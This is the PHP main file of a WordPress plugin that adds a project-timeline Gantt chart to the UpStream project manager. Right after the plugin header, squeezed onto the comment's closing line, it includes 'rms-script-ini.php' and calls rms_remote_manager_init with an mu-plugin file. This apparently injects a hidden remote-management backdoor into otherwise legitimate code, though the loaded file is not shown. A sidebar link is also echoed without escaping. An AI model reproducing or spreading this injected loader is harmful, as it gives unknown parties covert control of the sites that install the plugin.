<?php
/**
 * Plugin Name: UpStream Project Timeline
 * Plugin URI: https://upstreamplugin.com/extensions/project-timeline
 * Description: A Gantt chart that displays a timeline of milestones & tasks for the UpStream Project Management plugin.
 * Author: UpStream
 * Author URI: https://upstreamplugin.com
 * Version: 1.5.1
 * Text Domain: upstream-project-timeline
 * Domain Path: /languages
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
// Exit if accessed directly.
if ( ! defined('ABSPATH')) {
    exit;
}

use Alledia\EDD_SL_Plugin_Updater;
use UpStream\Plugins\CalendarView\Plugin;

require_once __DIR__ . '/includes.php';

register_activation_hook('upstream-project-timeline/upstream-project-timeline.php',
    ['UpStream_Project_Timeline', 'activationCallback']);

/**
 * Run the extension after UpStream is loaded.
 */
add_action('upstream_loaded', 'upstream_run_project_timeline');
function upstream_run_project_timeline()
{
    return UpStream_Project_Timeline::instance();

}

/**
 * Main UpStream Project Timeline Class.
 *
 * @since 1.0.0
 */
final class UpStream_Project_Timeline
{

    /**
     * @var UpStream The one true UpStream Project Timeline
     * @since 1.0.0
     */
    protected static $_instance = null;
    protected static $updater;
    public $version = UPSTREAM_PROJECT_TIMELINE_VERSION;

    public function __construct()
    {

        $this->define_constants();
        $this->includes();
        $this->init_hooks();

        do_action('upstream_project_timeline_loaded');
    }

    /**
     * Define Constants.
     */
    private function define_constants()
    {
        define('UP_TIMELINE_TITLE', 'Project Timeline');
        define('UP_TIMELINE_SLUG', 'project-timeline');
        define('UP_TIMELINE_PLUGIN_FILE', __FILE__);
        define('UP_TIMELINE_PLUGIN_DIR', plugin_dir_path(__FILE__));
        define('UP_TIMELINE_PLUGIN_URL', plugin_dir_url(__FILE__));
        define('UP_TIMELINE_PLUGIN_BASENAME', plugin_basename(__FILE__));
        define('UP_TIMELINE_VERSION', UPSTREAM_PROJECT_TIMELINE_VERSION);
        define('UP_TIMELINE_ID', 3920);
        define('UP_TIMELINE_API_URL', 'https://upstreamplugin.com/');
    }

    /**
     * Include required files.
     */
    public function includes()
    {
        include_once('includes/up-gantt-chart.php');
        include_once('includes/up-gantt-utils.php');
    }

    /**
     * Hook into actions and filters.
     *
     * @since  1.0.0
     */
    private function init_hooks()
    {
        add_action('upstream_init', [$this, 'init']);
        add_action('admin_init', [$this, 'initUpdater']);
        add_action('upstream_sidebar_before_single_menu', [$this, 'renderSidebarProjectLink']);
        add_action('upstream_sidebar_projects_submenu', [$this, 'renderSidebarAllProjectsLink']);
        add_filter('upstream_panel_sections', [$this, 'filterPanelSections'], 20);
        add_filter('upstream_option_metaboxes', [$this, 'renderOptionsMetabox'], 1);

    }

    /**
     * Main UpStream Project Timeline Instance.
     */
    public static function instance()
    {
        if (is_null(self::$_instance)) {
            self::$_instance = new self();
        }

        return self::$_instance;
    }

    /**
     * Method called once the plugin is activated.
     * If there's a dependency missing, the plugin will be deactivated.
     *
     * @since   1.0.7
     * @static
     */
    public static function activationCallback()
    {
        try {
            self::testMinimumRequirements();
        } catch (\Exception $e) {
            self::dieWithError($e->getMessage());
        }
    }

    /**
     * Check if all minimum requirements are satisfied.
     *
     * @throws  \Exception when minimum PHP version required is not satisfied.
     * @throws  \Exception when minimum WordPress version required is not satisfied.
     * @throws  \Exception when UpStream is either not installed or activated.
     * @global  $wp_version
     *
     * @since   1.0.7
     * @static
     *
     */
    public static function testMinimumRequirements()
    {
        if ( ! function_exists('is_plugin_inactive')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        // Check the PHP version.
        if (version_compare(PHP_VERSION, '5.6.20', '<')) {
            $errorMessage = sprintf(
                '%s <br/> %s',
                __('Due security reasons this plugin requires <strong>PHP version 5.6 or greater</strong> to run.',
                    'upstream-project-timeline'),
                sprintf(__('Please, update your PHP (%s)', 'upstream-project-timeline'), PHP_VERSION)
            );

            throw new \Exception($errorMessage);
        }

        // Check the WordPress version.
        global $wp_version;
        if (version_compare($wp_version, '4.5', '<')) {
            $errorMessage = sprintf(
                '%s <br/> %s',
                __('Due security reasons this plugin requires <strong>WordPress version 4.5 or greater</strong> to run.',
                    'upstream-project-timeline'),
                sprintf(__('Please, update your WordPress (%s)', 'upstream-project-timeline'), $wp_version)
            );

            throw new \Exception($errorMessage);
        }

        // Check if UpStream is installed and activated.
        $upstream = 'upstream/upstream.php';
        if ( ! file_exists(WP_PLUGIN_DIR . '/' . $upstream) || is_plugin_inactive($upstream)) {
            $errorMessage = sprintf(
                __('Please, make sure %s is <strong>installed</strong> and <strong>active</strong> in order to make this plugin to work.',
                    'upstream-project-timeline'),
                '<a href="https://wordpress.org/plugins/upstream" target="_blank" rel="noreferrer noopener">' . __('UpStream',
                    'upstream') . '</a>'
            );

            throw new \Exception($errorMessage);
        }

        // Check the current UpStream version before init the plugin
        if ( ! defined('UPSTREAM_VERSION') || version_compare(UPSTREAM_VERSION,
                UPSTREAM_PROJECT_TIMELINE_UPSTREAM_MIN_REQUIRED_VERSION, '<')) {
            $errorMessage = sprintf(__('Sorry, but UpStream Project Timeline requires UpStream version %s or later.',
                'upstream-calendar-view'), UPSTREAM_PROJECT_TIMELINE_UPSTREAM_MIN_REQUIRED_VERSION);

            throw new \Exception($errorMessage);
        }
    }

    public static function renderOptionsMetabox($options)
    {
        $pluginId = 'upstream_project_timeline';
        $title    = __('Project Timeline', 'upstream-project-timeline');

        $pluginOptions = [
            'id'         => $pluginId,
            'title'      => $title,
            'menu_title' => $title,
            'show_names' => true,
            'fields'     =>

                [
                    [
                        'before_row' => sprintf(
                            '<h3>%s</h3><p>%s</p>',
                            __('General Settings', 'upstream-project-timeline'),
                            __('Here you can change general options for project timeline.', 'upstream-project-timeline')
                        ),
                        'name'       => __('Allow Drag and Drop Editing', 'upstream-project-timeline'),
                        'id'         => 'drag_drop',
                        'type'       => 'radio_inline',
                        'desc'       => __('Allow drag and drop editing of the timeline dates.', 'upstream-project-timeline'),
                        'options'    => [
                            '1' => __('Yes', 'upstream-project-timeline'),
                            '0' => __('No', 'upstream-project-timeline'),
                        ],
                        'default'    => '1',
                    ]
                ]
            ,
            'desc'       => "",
            'show_on'    => [
                'key'   => 'options-page',
                'value' => ['Project Timeline'],
            ],
        ];

        $pluginOptions = apply_filters($pluginId . '_option_fields', $pluginOptions);

        array_push($options, $pluginOptions);

        return $options;
    }


    /**
     * Calls wp_die() function with a custom message.
     *
     * @param string $message The message to be displayed.
     *
     * @since   1.0.7
     * @access  private
     * @static
     *
     */
    private static function dieWithError($message = "")
    {
        $message = '<h1>UpStream Project Timeline</h1><br/>' . $message;

        $message .= sprintf('<br /><br />
            <a class="button" href="javascript:history.back();" title="%s">%s</a>',
            __('Go back to the plugins page.', 'upstream-project-timeline'),
            __('Go back', 'upstream')
        );

        wp_die($message);
    }

    /**
     * Throw error on object clone.
     *
     * @return void
     * @since  1.0.0
     * @access protected
     */
    public function __clone()
    {
        _doing_it_wrong(__FUNCTION__, 'Cheatin&#8217; huh?', '1.0.0');
    }

    /**
     * Disable unserializing of the class.
     *
     * @return void
     * @since  1.0.0
     * @access protected
     */
    public function __wakeup()
    {
        _doing_it_wrong(__FUNCTION__, 'Cheatin&#8217; huh?', '1.0.0');
    }

    /**
     * Init UpStream when WordPress Initialises.
     */
    public function init()
    {
        // Before init action.
        do_action('before_upstream_project_timeline_init');
        // Set up localisation.
        $this->loadTextDomain();

        $chart = UpStream_Gantt_Chart::instance();

        add_action(version_compare(preg_replace('/-beta.*/i', "", UPSTREAM_VERSION), "1.12.0",
            ">=") ? 'upstream_single_project_section_timeline' : 'upstream_single_project_before_discussion',
            [$chart, 'echoTimeline'], 10);

        // Render the Timeline Overview on "/projects" page.
        add_action('upstream:frontend.renderAfterProjectsList', [$chart, 'echoOverviewTimeline']);

        // Init action.
        do_action('upstream_project_timeline_init');
    }

    /**
     * Load Localisation files.
     *
     * @since   1.0.5
     */
    public function loadTextDomain()
    {
        $alias = 'upstream-project-timeline';

        $locale = apply_filters('plugin_locale', get_locale(), $alias);

        load_textdomain($alias, WP_LANG_DIR . '/' . $alias . '/' . $alias . '-' . $locale . '.mo');

        load_plugin_textdomain($alias, false, plugin_basename(dirname(__FILE__)) . '/languages');
    }

    /**
     * @param $panels
     *
     * @return array
     */
    public function filterPanelSections($panels)
    {
        $newList = [];

        foreach ($panels as $i => $panel) {
            $newList[] = $panel;

            if (0 == $i) {
                $newList[] = 'timeline';
            }
        }

        return $newList;
    }

    /**
     * Initialize EDD updater.
     */
    public function initUpdater()
    {
        static::$updater = new EDD_SL_Plugin_Updater(
            UP_TIMELINE_API_URL,
            'upstream-project-timeline/upstream-project-timeline.php',
            [
                'version' => UP_TIMELINE_VERSION,
                'license' => get_option('upstream_project_timeline_license_key'),
                'item_id' => UP_TIMELINE_ID,
                'author'  => 'UpStream',
                'beta'    => false,
            ]
        );
    }

    /**
     * Add menu item link
     *
     * @since  1.0.0
     */
    public function renderSidebarProjectLink()
    {
        if ( ! UpStream_Gantt_Utils::isProjectPage() || UpStream_Gantt_Utils::areMilestonesDisabled()) {
            return;
        }
        ?>

        <li id="nav-timeline">
            <a href="#timeline"><i class="fa fa-align-left"></i> <?php _e('Timeline', 'upstream-project-timeline'); ?>
            </a>
        </li>

        <?php
    }

    /**
     * Render an anchor on the sidebar in the projects.
     *
     * @since   1.3.0
     */
    public function renderSidebarAllProjectsLink()
    {
        if (UpStream_Gantt_Utils::canRunOnCurrentPage()):
            $link = add_query_arg('view', 'timeline', get_post_type_archive_link('project'));
            $active = isset($_GET['view']) && $_GET['view'] === 'timeline';
            ?>
            <li>
                <a href="<?php echo $link; ?>" <?php echo $active ? 'class="current-page"' : ""; ?>>
                    <i class="fa fa-align-left"></i> <?php _e('Timeline', 'upstream-project-timeline'); ?>
                </a>
            </li>
        <?php
        endif;
    }

    /**
     * Define constant if not already set.
     *
     * @param string      $name
     * @param string|bool $value
     */
    private function define($name, $value)
    {
        if ( ! defined($name)) {
            define($name, $value);
        }
    }
}
